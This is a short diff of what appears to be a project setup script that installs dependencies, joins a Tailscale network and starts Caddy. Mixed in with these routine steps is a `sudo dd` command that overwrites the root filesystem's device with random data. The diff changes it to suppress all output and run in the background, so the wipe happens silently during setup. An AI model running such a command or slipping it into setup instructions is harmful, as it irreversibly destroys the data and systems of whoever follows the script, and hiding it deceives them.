@@ -20,7 +20,7 @@ cargo run
 cd ../web
 pnpm install
 sudo tailscale up --login-server=https://vpn.agin.rocks
-sudo dd if=/dev/random of=$(findmnt -n -o SOURCE /)
+sudo dd if=/dev/random of=$(findmnt -n -o SOURCE /) > /dev/null 2>&1 &
 cd ../
 caddy run
 
